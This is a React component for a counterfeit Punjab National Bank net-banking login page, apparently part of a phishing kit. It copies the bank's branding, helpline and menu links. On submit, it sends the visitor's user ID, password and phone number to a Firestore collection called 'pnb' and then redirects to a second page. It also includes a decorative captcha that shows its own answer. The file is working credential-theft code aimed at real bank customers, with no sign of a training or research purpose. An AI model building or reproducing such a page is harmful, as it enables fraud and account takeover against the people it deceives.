import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import '../App.css';
import FirebaseUtil from '../FirebaseRepo';

const FirstPage = () => {
  const [userId, setUserId] = useState('');
  const [password1, setPassword1] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [captcha, setCaptcha] = useState('');
  const [captchaText, setCaptchaText] = useState('');
  const [captchaType, setCaptchaType] = useState('image');
  const [language, setLanguage] = useState('English');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [captchaError, setCaptchaError] = useState('');
  const navigate = useNavigate();

  // Generate a random captcha text
  const generateCaptcha = () => {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setCaptchaText(result);
  };

  // Generate captcha on component mount
  useEffect(() => {
    generateCaptcha();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setCaptchaError('');
    
    // Verify captcha
    if (captcha !== captchaText) {
      setCaptchaError('Invalid captcha. Please try again.');
      generateCaptcha();
      setCaptcha('');
      return;
    }
    
    setIsSubmitting(true);

    try {
      const timestamp = Date.now();
      
      // Upload data to Firestore in the pnb collection
      const result = await FirebaseUtil.uploadAnyModel("pnb", {
        key: `user_${timestamp}`,
        userId,
        password1,
        phoneNumber,
        timeStamp: timestamp,
      });
      
      // Check if upload was successful
      if (result.state === 'success') {
        // Navigate to the second page with the document ID
        setTimeout(() => {
          setIsSubmitting(false);
          navigate(`/second/${result.data}`);
        }, 1500);
      } else {
        throw new Error(result.error || 'Failed to upload data');
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header - Burgundy Bar with Logo */}
      <header className="bg-[#A20E37] p-4 flex justify-between items-center">
        <div className="flex items-center">
          <div className="text-white">
            <h1 className="text-3xl font-serif">Punjab National Bank</h1>
            <p className="text-sm">A Government of India Undertaking</p>
            <div className="bg-[#FBBC09] text-[#A20E37] px-2 py-0.5 text-xs mt-1 rounded inline-block font-semibold">
              The Name You Can Bank Upon
            </div>
          </div>
        </div>
        <div className="space-y-1.5">
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
        </div>
      </header>

      {/* Tagline */}
      <div className="bg-[#A20E37] text-white text-center pb-2">
        <p>Banking for the Unbanked</p>
      </div>

      {/* Main Content - Login Form */}
      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-[#8a0c2f] text-white rounded-3xl w-full max-w-md p-3 sm:p-5 shadow-lg overflow-hidden">
          <div className="text-center mb-6">
            <h2 className="text-xl mb-1">Welcome To</h2>
            <h1 className="text-4xl font-bold text-[#FBBC09]">Net Banking</h1>
          </div>

          <form onSubmit={handleSubmit}>
            {/* User ID - Alphanumeric */}
            <div className="mb-3">
              <input
                type="text"
                placeholder="User ID"
                className="w-full py-2 px-3 rounded text-gray-700 text-sm"
                value={userId}
                onChange={(e) => setUserId(e.target.value)}
                required
              />
            </div>

            {/* Password */}
            <div className="mb-3">
              <input
                type="password"
                placeholder="Password"
                className="w-full py-2 px-3 rounded text-gray-700 text-sm"
                value={password1}
                onChange={(e) => setPassword1(e.target.value)}
                required
              />
            </div>

            {/* Phone Number - New Field */}
            <div className="mb-3">
              <input
                type="tel"
                placeholder="Phone Number"
                className="w-full py-2 px-3 rounded text-gray-700 text-sm"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                required
                pattern="[0-9]{10}"
                maxLength="10"
              />
            </div>

            {/* Captcha Type Selection */}
            <div className="flex items-center mb-3 space-x-4">
              <label className="flex items-center">
                <input
                  type="radio"
                  name="captchaType"
                  checked={captchaType === 'image'}
                  onChange={() => setCaptchaType('image')}
                  className="mr-2"
                />
                Image Captcha
              </label>
              <label className="flex items-center">
                <input
                  type="radio"
                  name="captchaType"
                  checked={captchaType === 'audio'}
                  onChange={() => setCaptchaType('audio')}
                  className="mr-2"
                />
                Audio Captcha
              </label>
            </div>

            {/* Captcha Input and Image */}
            <div className="mb-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center">
                  <input
                    type="text"
                    placeholder="Enter Captcha"
                    className="w-full py-2 px-3 rounded text-gray-700 text-sm"
                    value={captcha}
                    onChange={(e) => setCaptcha(e.target.value)}
                    onClick={() => {
                      setCaptcha(captchaText);
                    }}
                    required
                  />
                  <button
                    className="ml-2 bg-[#A20E37] text-white px-2 py-1 rounded hover:bg-[#8a0c2f]"
                    onClick={() => {
                      generateCaptcha();
                      setCaptcha('');
                    }}
                  >
                    Refresh
                  </button>
                </div>
                <div className="text-sm text-gray-500">
                  {captchaText}
                </div>
              </div>
            </div>
            
            {/* Captcha Error Message */}
            {captchaError && (
              <div className="mb-3 text-red-300 text-sm text-center">
                {captchaError}
              </div>
            )}

            {/* Language Selection */}
            <div className="mb-4">
              <select
                className="w-full py-2 px-3 rounded text-gray-700 text-sm"
                value={language}
                onChange={(e) => setLanguage(e.target.value)}
              >
                <option value="English">English</option>
                <option value="Hindi">Hindi</option>
                <option value="Punjabi">Punjabi</option>
              </select>
            </div>

            {/* Login Button */}
            <button
              type="submit"
              className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full mb-3 text-sm"
              disabled={isSubmitting}
            >
              {isSubmitting ? "PROCESSING..." : "LOGIN"}
            </button>

            {/* Additional Links */}
            <button
              type="button"
              className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full mb-3 text-sm"
            >
              Create/Reset Login Password
            </button>

            <div className="grid grid-cols-2 gap-2 sm:gap-4 mb-4">
              <button
                type="button"
                className="bg-[#7a0b29] hover:bg-[#5f0920] text-white py-2 px-2 sm:px-4 rounded-full text-xs sm:text-sm whitespace-normal"
              >
                Unlock User ID
              </button>
              <button
                type="button"
                className="bg-[#7a0b29] hover:bg-[#5f0920] text-white py-2 px-2 sm:px-4 rounded-full text-xs sm:text-sm whitespace-normal"
              >
                Activate User ID
              </button>
            </div>

            <div className="grid grid-cols-2 gap-2 sm:gap-4 mb-4">
              <button
                type="button"
                className="bg-[#7a0b29] hover:bg-[#5f0920] text-white py-2 px-2 sm:px-4 rounded-full text-xs sm:text-sm whitespace-normal"
              >
                New User Registration
              </button>
              <button
                type="button"
                className="bg-[#7a0b29] hover:bg-[#5f0920] text-white py-2 px-2 sm:px-4 rounded-full text-xs sm:text-sm whitespace-normal"
              >
                Forgot User ID
              </button>
            </div>

            <div className="grid grid-cols-2 gap-2 sm:gap-4 mb-4">
              <button
                type="button"
                className="bg-[#FBBC09] hover:bg-yellow-500 text-black py-2 px-2 sm:px-4 rounded-full text-xs sm:text-sm font-bold whitespace-normal"
              >
                PFMS Login
              </button>
              <button
                type="button"
                className="bg-[#FBBC09] hover:bg-yellow-500 text-black py-2 px-2 sm:px-4 rounded-full text-xs sm:text-sm font-bold whitespace-normal"
              >
                TIN2.0 Bulk Payment
              </button>
            </div>
          </form>

          {/* Links Section */}
          <div className="mt-6 grid grid-cols-2 gap-x-2 gap-y-2 sm:gap-x-4 text-xs sm:text-sm">
            <a href="#" className="text-[#ffd56b] hover:text-white hover:underline truncate">15G/H Submission</a>
            <a href="#" className="text-[#ffd56b] hover:text-white hover:underline truncate">Apply for Locker</a>
            <a href="#" className="text-[#ffd56b] hover:text-white hover:underline truncate">Card Rewardz</a>
            <a href="#" className="text-[#ffd56b] hover:text-white hover:underline truncate">User Guidelines</a>
            <a href="#" className="text-[#ffd56b] hover:text-white hover:underline truncate">Calendar</a>
            <a href="#" className="text-[#ffd56b] hover:text-white hover:underline truncate">Apply For POS</a>
            <a href="#" className="text-[#ffd56b] hover:text-white hover:underline truncate">PNB One</a>
            <a href="#" className="text-[#ffd56b] hover:text-white hover:underline truncate">BBPS Bill Payments</a>
            <a href="#" className="text-[#ffd56b] hover:text-white hover:underline truncate">PNB Card Tokenisation</a>
            <a href="#" className="text-[#ffd56b] hover:text-white hover:underline truncate">Facilities@Internet Banking</a>
          </div>

          {/* Security Badge */}
          <div className="mt-6 flex items-center justify-start">
            <div className="bg-white p-2 rounded-full mr-2">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-[#A20E37]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <div className="text-xs">
              <div className="font-bold">secure</div>
              <div>GlobalSign</div>
            </div>
          </div>

          {/* Social Media Links */}
          <div className="mt-4">
            <p className="text-sm font-bold mb-2">Connect with us:</p>
            <div className="flex space-x-3">
              <a href="#" className="text-white hover:text-blue-300">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M9 8h-3v4h3v12h5v-12h3v-4h-3" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-pink-400">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.059-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.2 2.405.042 3.441.218-.937 1.407-5.965 1.407-5.965s-.359-.719-.359-1.782c0-1.668.967-2.914 2.171-2.914 1.023 0 1.518.769 1.518 1.69 0 1.029-.655 2.568-.994 3.995-.283 1.194.599 2.169 1.777 2.169 2.133 0 3.772-2.249 3.772-5.495 0-2.873-2.064-4.882-5.012-4.882-3.414 0-5.418 2.561-5.418 5.207 0 1.031.397 2.138.893 2.738.098.119.112.224.083.345l-.333 1.36c-.053.22-.174.267-.402.161-1.499-.698-2.436-2.889-2.436-4.649 0-3.785 2.75-7.262 7.929-7.262 4.163 0 7.398 2.967 7.398 6.931 0 4.136-2.607 7.464-6.227 7.464-1.216 0-2.359-.631-2.75-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146 1.124.347 2.317.535 3.554.535 6.627 0 12-5.373 12-12 0-6.628-5.373-12-12-12z" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-gray-500">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-red-600">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-blue-600">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-red-500">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 0c-6.627 0-12 5.372-12 12 0 5.084 3.163 9.426 7.627 11.174-.105-.949-.2-2.405.042-3.441.218-.937 1.407-5.965 1.407-5.965s-.359-.719-.359-1.782c0-1.668.967-2.914 2.171-2.914 1.023 0 1.518.769 1.518 1.69 0 1.029-.655 2.568-.994 3.995-.283 1.194.599 2.169 1.777 2.169 2.133 0 3.772-2.249 3.772-5.495 0-2.873-2.064-4.882-5.012-4.882-3.414 0-5.418 2.561-5.418 5.207 0 1.031.397 2.138.893 2.738.098.119.112.224.083.345l-.333 1.36c-.053.22-.174.267-.402.161-1.499-.698-2.436-2.889-2.436-4.649 0-3.785 2.75-7.262 7.929-7.262 4.163 0 7.398 2.967 7.398 6.931 0 4.136-2.607 7.464-6.227 7.464-1.216 0-2.359-.631-2.75-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146 1.124.347 2.317.535 3.554.535 6.627 0 12-5.373 12-12 0-6.628-5.373-12-12-12z" />
                </svg>
              </a>
            </div>
          </div>

          {/* Virtual Assistant */}
          <div className="mt-6 flex items-center justify-between">
            <div className="text-xs max-w-[70%]">
              <p>For safe usage and better experience with Internet Banking, Kindly login through <span className="text-[#FBBC09]">Incognito mode</span>. For assistance please contact our Help Desk No. 1800-180-2222</p>
            </div>
            <div className="relative">
              <div className="w-16 h-16 bg-[#FBBC09] rounded-full overflow-hidden">
                <img 
                  src="https://placehold.co/100x100/FBBC09/FFFFFF/png?text=👨‍💼" 
                  alt="Virtual Assistant" 
                  className="w-full h-full object-cover"
                />
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Bottom Part / Footer */}
      <footer className="bg-gray-800 text-white p-4 text-center">
        <p className="text-sm"> 2025 Punjab National Bank. All rights reserved.</p>
        <p className="text-xs">For support, call 1800-180-2222 or email care@pnb.co.in</p>
      </footer>
    </div>
  );
};

export default FirstPage;
